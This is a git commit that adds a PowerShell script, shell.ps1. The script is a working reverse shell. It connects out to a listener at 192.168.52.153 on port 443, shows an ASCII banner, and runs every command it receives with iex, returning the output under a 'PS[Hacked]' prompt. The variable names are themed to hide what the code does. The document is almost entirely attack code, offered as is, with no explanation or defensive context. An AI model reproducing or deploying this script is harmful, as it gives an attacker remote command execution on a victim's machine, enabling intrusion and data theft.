449b47088d341b9c1c8c851219e15a66b9dc27fe
iiishell <102308740+iiishell@users.noreply.github.com>
2022-03-24 14:53:15 +0000

    Create shell.ps1

---
+++ shell.ps1
@@ -0,0 +1,34 @@
+$welcome = '
+                ___      ___          ___          ___          ___     
+      ___      /\__\    /\  \        /\  \        /\  \        /\__\    
+     /\  \    /::|  |   \:\  \      /::\  \      /::\  \      /:/  /    
+     \:\  \  /:|:|  |    \:\  \    /:/\:\  \    /:/\:\  \    /:/__/     
+     /::\__\/:/|:|  |__  /::\  \  /::\~\:\  \  /:/  \:\  \  /::\  \ ___ 
+  __/:/\/__/:/ |:| /\__\/:/\:\__\/:/\:\ \:\__\/:/__/ \:\__\/:/\:\  /\__\
+ /\/:/  /  \/__|:|/:/  /:/  \/__/\:\~\:\ \/__/\:\  \  \/__/\/__\:\/:/  /
+ \::/__/       |:/:/  /:/  /      \:\ \:\__\   \:\  \           \::/  / 
+  \:\__\       |::/  /\/__/        \:\ \/__/    \:\  \          /:/  /  
+   \/__/       /:/  /               \:\__\       \:\__\        /:/  /   
+               \/__/                 \/__/        \/__/        \/__/    
+ => Appuyer sur Entree..
+ ';
+if(1 -eq 1){
+	$mikasa = 0
+	$eren='192.168.52.153';
+	$yaeger=443;
+	$SNK = New-Object System.Net.Sockets.TCPClient($eren,$yaeger);
+}
+
+$titan = $SNK.GetStream();
+
+[byte[]]$b = 0..65535|%{0};
+$titan.Write(([text.encoding]::ASCII).GetBytes($welcome),0,$welcome.Length);
+while(($i = $titan.Read($b, 0, $b.Length)) -ne 0){;
+	$nissan = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+	$sb = (iex $nissan 2>&1 | Out-String );
+	$sb2 = $sb + 'PS[Hacked] ' + (pwd).Path + '> ';
+	$sbt = ([text.encoding]::ASCII).GetBytes($sb2);
+	$titan.Write($sbt,0,$sbt.Length);
+	$titan.Flush()
+};
+$SNK.Close()
